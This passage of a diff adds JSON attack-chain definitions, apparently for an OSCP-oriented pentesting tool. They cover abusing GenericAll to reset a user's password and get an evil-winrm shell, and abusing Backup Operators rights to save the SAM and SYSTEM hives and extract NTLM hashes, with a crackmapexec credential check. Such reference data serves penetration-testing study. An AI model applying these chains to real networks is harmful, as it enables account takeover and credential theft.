+      "description": "Abuse GenericAll to reset target user password and use their credentials",
+      "severity": "high",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Reset target user password",
+          "why": "GenericAll includes the ForceChangePassword right, allowing password reset without knowing current password.",
+          "command": "net-user-password-reset",
+          "context": "on_target",
+          "verification": "crackmapexec smb <DC_IP> -u '<TARGET>' -p '<NEW_PASSWORD>'"
+        },
+        {
+          "step_id": 2,
+          "name": "Access target's resources",
+          "why": "With the new password, we can authenticate as the target user and access their resources.",
+          "command": "evil-winrm-shell",
+          "context": "kali",
+          "result": "Shell as target user"
+        }
+      ]
+    }
+  },
+  "attack-chain-backup-operators-sam": {
+    "commands": [
+      "reg-save-sam",
+      "secretsdump-sam"
+    ],
+    "access_type": null,
+    "context": "Backup Operators SAM Dump - Credential Extraction",
+    "permissions_required": "Backup Operators membership",
+    "prerequisite_queries": [
+      "prereq-backup-operators"
+    ],
+    "attack_chain": {
+      "id": "backup-operators-sam",
+      "name": "Backup Operators SAM Dump",
+      "description": "Abuse Backup Operators privileges to backup and extract SAM/SYSTEM hashes",
+      "severity": "high",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Backup SAM and SYSTEM hives",
+          "why": "Backup Operators have SeBackupPrivilege, allowing backup of any file including registry hives.",
+          "command": "reg-save-sam",
+          "context": "on_target",
+          "verification": "dir C:\\temp\\sam C:\\temp\\system"
+        },
+        {
+          "step_id": 2,
+          "name": "Extract hashes from hives",
+          "why": "SAM contains local account hashes, SYSTEM contains the key to decrypt them.",
+          "command": "secretsdump-sam",
+          "context": "kali",
+          "result": "Local Administrator NTLM hash"
+        }
+      ]
+    }
+  }
+}
